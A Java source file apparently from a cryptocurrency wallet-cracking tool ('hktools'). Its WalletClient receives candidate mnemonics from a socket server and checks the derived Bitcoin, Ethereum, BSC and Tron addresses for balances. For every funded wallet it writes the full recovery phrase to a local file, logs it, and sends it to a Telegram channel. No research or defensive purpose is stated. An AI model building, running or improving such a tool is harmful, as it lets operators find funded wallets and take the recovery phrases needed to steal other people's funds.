package com.hktools;

import com.hktools.model.CoinEntry;
import com.hktools.model.Wallet;
import com.hktools.parser.JsonMessageParser;
import com.hktools.service.BtcScan;
import com.hktools.service.EthereumWeb3;
import com.hktools.service.Telegram;
import com.hktools.service.Tronscan;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.slf4j.Marker;
import org.slf4j.MarkerFactory;

import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.math.BigDecimal;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Optional;

/**
 * WalletClient composes a SocketClient and a JsonMessageParser.
 * It connects to server, listens for lines, parses JSON wallet messages
 * (parser already ignores non-JSON lines) and stores parsed Wallets in-memory.
 */
public class WalletClient {
    private static final Logger logger = LoggerFactory.getLogger(WalletClient.class);
    private static final Marker WALLET_FOUND = MarkerFactory.getMarker("WALLET_FOUND");

    private final int id;
    private final SocketClient client;
    private final JsonMessageParser parser = new JsonMessageParser();
    private final List<Wallet> storedWallets = Collections.synchronizedList(new ArrayList<>());
    private volatile boolean started = false;

    // Balance checking services
    private BtcScan btcScan = new BtcScan();
    private EthereumWeb3 ethWeb3 = new EthereumWeb3(EthereumWeb3.Network.ETHEREUM);
    private EthereumWeb3 bscWeb3 = new EthereumWeb3(EthereumWeb3.Network.BSC);
    private Tronscan tronscan = new Tronscan();
    private final String walletFilePath = "wallets_with_balance.txt";
    private int checkCount = 0;

    // Error counters for 503 upstream errors
    private int btc503ErrorCount = 0;
    private int eth503ErrorCount = 0;
    private int bsc503ErrorCount = 0;
    private int trx503ErrorCount = 0;

    private static final int REINIT_THRESHOLD = 100;
    private static final int TELEGRAM_ALERT_THRESHOLD = 1000;

    public WalletClient(int id, String host, int port, int timeoutMs, boolean autoReconnect) {
        this.id = id;
        this.client = new SocketClient(host, port, timeoutMs, autoReconnect);
    }

    public void start() throws IOException {
        client.connect();
        client.startListening(line -> {
            logger.info("[client-{}] Received: {}", id, line);
            try {
                Optional<Wallet> maybe = parser.parseLine(line);
                maybe.ifPresent(wallet -> {
//                    storedWallets.add(wallet);
                    logger.info("[client-{}] Stored wallet mnemonic (first word): {}", id,
                            wallet.mnemonic == null ? "" : wallet.mnemonic.split("\\s+")[0]);

                    // Check balances for this wallet
                    checkBalancesAndSave(wallet);
                    if(++checkCount % 10 == 0) {
                        logger.warn("[client-{}] Check {}", id, checkCount);
                    }
                    try {
                        client.sendLine("newwallet");
                    } catch (IOException e) {
                        this.client.close();
                        try {
                            start();
                        } catch (IOException ex) {
                            throw new RuntimeException(ex);
                        }
                    }
                });
            } catch (Exception e) {
                logger.error("[client-{}] Error while parsing line: {}", id, e.getMessage(), e);
            }
        });
        started = true;
    }

    public void stop() {
        client.close();
        started = false;
    }

    public void sendLine(String line) throws IOException {
        client.sendLine(line);
    }

    public List<Wallet> getStoredWallets() {
        return storedWallets;
    }

    public int getId() {
        return id;
    }

    public boolean isStarted() {
        return started;
    }

    /**
     * Check balances for all coins in the wallet and save to file if any balance > 0
     * Tracks 503 errors and reinitializes services at 100 errors, alerts at 1000 errors
     */
    private void checkBalancesAndSave(Wallet wallet) {
        List<String> walletsWithBalance = new ArrayList<>();
        boolean hasBalance = false;

        logger.info("[client-{}] Checking balances for wallet...", id);

        for (CoinEntry coin : wallet.coins) {
            try {
                String coinName = coin.name.toUpperCase();
                String address = coin.address;

                switch (coinName) {
                    case "BITCOIN":
                        try {
                            int btcTxCount = btcScan.getBalance(address);
                            if (btcTxCount > 0) {
                                hasBalance = true;
                                String btcInfo = String.format("BTC - Address: %s, TX Count: %d", address, btcTxCount);
                                walletsWithBalance.add(btcInfo);
                                logger.info("[client-{}] FOUND BTC BALANCE! {}", id, btcInfo);
                            }
                            btc503ErrorCount = 0;
                        } catch (Exception btcEx) {
                            if (btcEx.getMessage() != null && btcEx.getMessage().contains("503")) {
                                btc503ErrorCount++;
                                logger.warn("[client-{}] BTC 503 error (count: {}): {}", id, btc503ErrorCount, btcEx.getMessage());
                                if (btc503ErrorCount == REINIT_THRESHOLD) {
                                    logger.error("[client-{}] BTC 503 error count reached {}, reinitializing BtcScan...", id, REINIT_THRESHOLD);
                                    btcScan = new BtcScan();
                                }
                                if (btc503ErrorCount >= TELEGRAM_ALERT_THRESHOLD) {
                                    String alertMsg = String.format("[client-%d] BTC Service: 503 error count reached %d - persistent connection issue", id, btc503ErrorCount);
                                    logger.error(alertMsg);
                                    try {
                                        Telegram.getInstance().sendMessage(alertMsg);
                                    } catch (Exception teleEx) {
                                        logger.error("[client-{}] Failed to send Telegram alert: {}", id, teleEx.getMessage());
                                    }
                                }
                            } else {
                                throw btcEx;
                            }
                        }
                        break;

                    case "ETHEREUM":
                        try {
                            BigDecimal ethBalance = ethWeb3.getBalance(address);
                            if (ethBalance.compareTo(BigDecimal.ZERO) > 0) {
                                hasBalance = true;
                                String ethInfo = String.format("ETH - Address: %s, Balance: %s", address, ethBalance.toPlainString());
                                walletsWithBalance.add(ethInfo);
                                logger.warn("[client-{}] FOUND ETH BALANCE! {}", id, ethInfo);
                            }
                            eth503ErrorCount = 0;
                        } catch (Exception ethEx) {
                            if (ethEx.getMessage() != null && ethEx.getMessage().contains("503")) {
                                eth503ErrorCount++;
                                logger.warn("[client-{}] ETH 503 error (count: {}): {}", id, eth503ErrorCount, ethEx.getMessage());
                                if (eth503ErrorCount == REINIT_THRESHOLD) {
                                    logger.error("[client-{}] ETH 503 error count reached {}, reinitializing EthereumWeb3 (ETHEREUM)...", id, REINIT_THRESHOLD);
                                    ethWeb3 = new EthereumWeb3(EthereumWeb3.Network.ETHEREUM);
                                }
                                if (eth503ErrorCount >= TELEGRAM_ALERT_THRESHOLD) {
                                    String alertMsg = String.format("[client-%d] ETH Service: 503 error count reached %d - persistent connection issue", id, eth503ErrorCount);
                                    logger.error(alertMsg);
                                    try {
                                        Telegram.getInstance().sendMessage(alertMsg);
                                    } catch (Exception teleEx) {
                                        logger.error("[client-{}] Failed to send Telegram alert: {}", id, teleEx.getMessage());
                                    }
                                }
                            } else {
                                throw ethEx;
                            }
                        }
//                        break;
//
//                    case "BSC":
                        try {
                            BigDecimal bscBalance = bscWeb3.getBalance(address);
                            if (bscBalance.compareTo(BigDecimal.ZERO) > 0) {
                                hasBalance = true;
                                String bscInfo = String.format("BSC - Address: %s, Balance: %s", address, bscBalance.toPlainString());
                                walletsWithBalance.add(bscInfo);
                                logger.warn("[client-{}] FOUND BSC BALANCE! {}", id, bscInfo);
                            }
                            bsc503ErrorCount = 0;
                        } catch (Exception bscEx) {
                            if (bscEx.getMessage() != null && bscEx.getMessage().contains("503")) {
                                bsc503ErrorCount++;
                                logger.warn("[client-{}] BSC 503 error (count: {}): {}", id, bsc503ErrorCount, bscEx.getMessage());
                                if (bsc503ErrorCount == REINIT_THRESHOLD) {
                                    logger.error("[client-{}] BSC 503 error count reached {}, reinitializing EthereumWeb3 (BSC)...", id, REINIT_THRESHOLD);
                                    bscWeb3 = new EthereumWeb3(EthereumWeb3.Network.BSC);
                                }
                                if (bsc503ErrorCount >= TELEGRAM_ALERT_THRESHOLD) {
                                    String alertMsg = String.format("[client-%d] BSC Service: 503 error count reached %d - persistent connection issue", id, bsc503ErrorCount);
                                    logger.error(alertMsg);
                                    try {
                                        Telegram.getInstance().sendMessage(alertMsg);
                                    } catch (Exception teleEx) {
                                        logger.error("[client-{}] Failed to send Telegram alert: {}", id, teleEx.getMessage());
                                    }
                                }
                            } else {
                                throw bscEx;
                            }
                        }
                        break;

                    case "TRX":
                    case "TRON":
                        try {
                            int trxBalance = tronscan.getBalance(address);
                            if (trxBalance > 0) {
                                hasBalance = true;
                                double trxAmount = trxBalance;
                                String trxInfo = String.format("TRX - Address: %s, Balance: %.6f TRX (%d sun)",
                                    address, trxAmount, trxBalance);
                                walletsWithBalance.add(trxInfo);
                                logger.warn("[client-{}] FOUND TRX BALANCE! {}", id, trxInfo);
                            }
                            trx503ErrorCount = 0;
                        } catch (Exception trxEx) {
                            if (trxEx.getMessage() != null && trxEx.getMessage().contains("503")) {
                                trx503ErrorCount++;
                                logger.warn("[client-{}] TRX 503 error (count: {}): {}", id, trx503ErrorCount, trxEx.getMessage());
                                if (trx503ErrorCount == REINIT_THRESHOLD) {
                                    logger.error("[client-{}] TRX 503 error count reached {}, reinitializing Tronscan...", id, REINIT_THRESHOLD);
                                    tronscan = new Tronscan();
                                }
                                if (trx503ErrorCount >= TELEGRAM_ALERT_THRESHOLD) {
                                    String alertMsg = String.format("[client-%d] TRX Service: 503 error count reached %d - persistent connection issue", id, trx503ErrorCount);
                                    logger.error(alertMsg);
                                    try {
                                        Telegram.getInstance().sendMessage(alertMsg);
                                    } catch (Exception teleEx) {
                                        logger.error("[client-{}] Failed to send Telegram alert: {}", id, teleEx.getMessage());
                                    }
                                }
                            } else {
                                throw trxEx;
                            }
                        }
                        break;

                    default:
                        logger.debug("[client-{}] Skipping unknown coin: {}", id, coinName);
                }
            } catch (Exception e) {
                logger.error("[client-{}] Error checking balance for {} ({}): {}",
                    id, coin.name, coin.address, e.getMessage(), e);
            }
        }

        // If any balance found, save to file
        if (hasBalance) {
            saveWalletToFile(wallet, walletsWithBalance);
        }
    }

    /**
     * Save wallet with balance information to file
     */
    private void saveWalletToFile(Wallet wallet, List<String> walletsWithBalance) {
        synchronized (this) {
            String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss"));
            try (FileWriter fw = new FileWriter(walletFilePath, true);
                 PrintWriter pw = new PrintWriter(fw)) {

                pw.println("================================================================================");
                pw.println("Timestamp: " + timestamp);
                pw.println("Client ID: " + id);
                pw.println("Mnemonic: " + wallet.mnemonic);
                pw.println("--------------------------------------------------------------------------------");

                for (String balanceInfo : walletsWithBalance) {
                    pw.println(balanceInfo);
                }

                pw.println("All coins in wallet:");
                for (CoinEntry coin : wallet.coins) {
                    pw.println(String.format("  %s - Address: %s", coin.name, coin.address));
                }

                pw.println("================================================================================");
                pw.println();

                logger.info("[client-{}] Wallet with balance saved to {}", id, walletFilePath);
            } catch (IOException e) {
                logger.error("[client-{}] Error saving wallet to file: {}", id, e.getMessage(), e);
            }
            try {

                // Log to dedicated wallet balance log file with WALLET_FOUND marker
                StringBuilder logMessage = new StringBuilder();
                logMessage.append(String.format("\n[client-%d] ================ WALLET WITH BALANCE FOUND ================\n", id));
                logMessage.append(String.format("Timestamp: %s\n", timestamp));
                logMessage.append(String.format("Mnemonic: %s\n", wallet.mnemonic));
                logMessage.append("----------------------------------------\n");
                logMessage.append("Balances Found:\n");
                for (String balanceInfo : walletsWithBalance) {
                    logMessage.append(String.format("  %s\n", balanceInfo));
                }
                logMessage.append("----------------------------------------\n");
                logMessage.append("All coins in wallet:\n");
                for (CoinEntry coin : wallet.coins) {
                    logMessage.append(String.format("  %s - Address: %s\n", coin.name, coin.address));
                }
                logMessage.append("================================================================");

                logger.warn(WALLET_FOUND, logMessage.toString());
                Telegram.getInstance().sendMessage(logMessage.toString());
            } catch (Exception e) {
                logger.warn("[client-{}] Error logging wallet with balance: {}", id, e.getMessage(), e);
            }
        }
    }
}

